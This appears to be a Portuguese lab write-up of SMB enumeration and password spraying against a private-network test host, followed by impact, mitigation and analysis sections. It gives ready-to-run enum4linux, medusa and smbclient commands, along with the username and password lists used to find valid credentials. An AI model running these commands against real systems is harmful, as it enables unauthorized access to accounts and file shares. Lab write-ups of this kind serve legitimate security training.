# SMB Enumeration & Attack

## Descrição

SMB (Server Message Block) é um protocolo utilizado para compartilhamento de arquivos e recursos em rede. Quando mal configurado, pode expor informações sensíveis e permitir acessos não autorizados.

## Enumeração

Foi realizada a enumeração do serviço SMB para identificar usuários, compartilhamentos e possíveis vulnerabilidades:

```bash id="q5k3dr"
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```

## Exploração

### Criação da lista de usuários:

```bash id="s9t8vl"
echo -e "user\nmsfadmin\nservice" > smb_users.txt
```

### Criação da lista de senhas (password spraying):

```bash id="5z1lqn"
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

### Execução do ataque:

```bash id="3c2wqp"
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 4
```

## Resultado

Foram identificadas credenciais válidas durante o ataque de password spraying.

## Validação

Foi realizada a verificação dos acessos disponíveis utilizando:

```bash id="i0j8yx"
smbclient -L //192.168.56.101 -U msfadmin
```

## Evidência

<img width="1279" height="287" alt="image" src="https://github.com/user-attachments/assets/4b8f5872-a183-4d79-99ac-8dc2e40b938d" />

<img width="748" height="330" alt="image" src="https://github.com/user-attachments/assets/b33a4dd9-72a6-4a79-ba87-e80f3f5d9f3f" />


## Impacto

* Possível acesso a compartilhamentos de arquivos
* Exposição de informações sensíveis
* Comprometimento da rede

## Mitigação

 * Restrição de acesso a compartilhamentos SMB (controle de permissões)
 * Uso de senhas fortes e políticas de autenticação seguras
 * Desativação de acessos anônimos (anonymous login)
 * Monitoramento e auditoria de tentativas de autenticação
 * Bloqueio de conta após múltiplas tentativas de login
 * Desativação de versões inseguras do protocolo SMB (ex: SMBv1)  

## Análise

A vulnerabilidade está relacionada à exposição de serviços SMB com autenticação fraca e ausência de mecanismos de proteção contra múltiplas tentativas de login, permitindo a descoberta de credenciais válidas através de password spraying.
